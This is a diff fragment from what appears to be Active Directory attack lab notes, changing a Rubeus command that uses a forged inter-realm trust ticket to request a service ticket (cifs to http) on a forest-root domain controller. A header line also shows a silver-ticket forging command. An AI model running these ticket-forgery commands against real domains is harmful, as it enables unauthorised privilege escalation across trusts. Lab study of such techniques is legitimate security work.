@@ -63,7 +63,7 @@ Rubeus.exe evasive-silver /service:krbtgt/dollarcorp.moneycorp.local /rc4:<hash>
 {% code overflow="wrap" %}
 ```powershell
 # Forge the ticket
-Rubeus.exe asktgs /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt /ticket:C:\AD\Tools\trust_tkt.kirbi
+Rubeus.exe asktgs /service:http/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt /ticket:C:\AD\Tools\trust_tkt.kirbi
 ```
 {% endcode %}
 
